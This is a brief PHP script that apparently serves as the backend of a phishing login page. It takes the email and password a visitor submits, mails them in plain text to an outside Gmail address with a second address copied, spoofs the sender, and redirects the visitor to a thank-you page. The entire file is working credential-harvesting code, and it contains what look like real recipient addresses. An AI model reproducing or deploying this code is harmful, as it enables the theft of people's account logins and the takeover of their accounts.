<?php
//get data from form
$email= $_POST['email'];
$password = $_POST['password'];

$to = "kimlila000000@gmail.com";

$subject = "Mail from codeconia";
$txt ="Email = ".$email . "\r\n Password =" .$password;

$headers = "From: noreply@codeconia.com" . "\r\n" .
"CC: liltekk5@gmail.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>